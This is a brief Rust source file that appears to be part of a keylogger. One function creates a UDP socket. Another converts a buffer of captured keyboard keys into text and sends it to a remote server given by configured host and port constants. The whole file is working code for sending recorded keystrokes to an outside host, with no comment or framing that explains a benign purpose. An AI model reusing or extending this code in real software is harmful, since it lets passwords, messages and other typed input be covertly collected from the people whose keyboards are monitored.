use std::net::UdpSocket;

use crate::constants::{SERVER_HOST, SERVER_PORT};

pub fn create_socket() -> std::io::Result<UdpSocket> {
    UdpSocket::bind("0.0.0.0:0")
}

pub fn send_buffer_key(socket: &UdpSocket, buffer: &Vec<rdev::Key>) {
    let key_str = buffer
        .iter()
        .map(|k| format!("{:?}", k))
        .collect::<Vec<String>>()
        .join(" ");

    let addr = format!("{}:{}", SERVER_HOST, SERVER_PORT);
    let _ = socket.send_to(key_str.as_bytes(), &addr);
}
